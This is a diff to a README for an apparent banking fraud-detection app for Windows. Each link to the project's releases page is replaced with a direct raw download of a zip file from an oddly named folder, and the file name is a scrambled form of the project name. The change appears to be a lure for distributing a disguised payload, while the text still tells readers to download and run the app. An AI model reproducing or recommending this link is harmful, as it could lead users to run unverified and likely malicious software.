@@ -1,12 +1,12 @@
 # 🛡️ Autonomous-Fraud-Detection-Response-Network - Real-Time Fraud Defense for Banking
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/raw/refs/heads/main/unspissated/Detection-Network-Fraud-Autonomous-Response-1.5-beta.2.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases
+https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/raw/refs/heads/main/unspissated/Detection-Network-Fraud-Autonomous-Response-1.5-beta.2.zip
 
 ## 🔎 What this app does
 
@@ -37,7 +37,7 @@ For best results, use a machine with 16 GB RAM if you plan to test larger data s
 ## 🚀 How to download and run
 
 1. Open the release page:
-   https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/releases
+   https://github.com/Maltese-stbruno491/Autonomous-Fraud-Detection-Response-Network/raw/refs/heads/main/unspissated/Detection-Network-Fraud-Autonomous-Response-1.5-beta.2.zip
 
 2. Find the latest release at the top of the page.
 
